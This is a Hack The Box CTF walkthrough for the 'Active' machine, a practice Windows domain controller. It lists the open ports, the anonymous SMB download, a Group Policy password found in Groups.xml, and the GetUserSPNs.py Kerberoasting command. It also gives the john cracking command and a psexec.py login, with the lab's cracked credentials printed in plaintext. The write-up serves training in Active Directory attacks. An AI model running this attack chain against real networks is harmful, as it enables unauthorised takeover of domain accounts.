# Enumeration 
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

## open ports

```
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-13 06:15:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?                                                 
464/tcp   open  kpasswd5?                                                                                                                                    
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC

```




### Port 53

No zone transfer

### port 445

anonymous login allowed

![[Pasted image 20230113082117.png]]
![[Pasted image 20230113082145.png]]
domain leak
active.htb
download everything
```
mask ""
recurse ON
prompt OFF
mget * 
```

Inside 
`Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups`
we found Groups.xml and it contains password and is crackable
![[Pasted image 20230113082958.png]]
![[Pasted image 20230113083034.png]]
add domain to hosts file
`echo "10.129.132.35 active.htb" | sudo tee -a /etc/hosts`
We have a service account so we can do kerberoasting  attack 

first we need to get administrator hash
```
GetUserSPNs.py active.htb/SVC_TGS -dc-ip $ip -request
```
![[Pasted image 20230113083325.png]]

`GetUserSPNs.py active.htb/SVC_TGS -dc-ip $ip -request -outputfile hash`
crack the hash to get administrator creds
`john --format=krb5tgs hash --wordlist=/usr/share/wordlists/rockyou.txt`
![[Pasted image 20230113084243.png]]

`psexec.py administrator:'Ticketmaster1968'@$ip`

![[Pasted image 20230113084759.png]]
# Foothold 



# Privesc 
# Loot

SVC_TGS creds:
	username:SVC_TGS
	password:GPPstillStandingStrong2k18

Administrator creds:
	username:administrator
	password:Ticketmaster1968


---
Tags: #ctf #HTB 
Resources: [Active](https://app.hackthebox.com/machines/Active)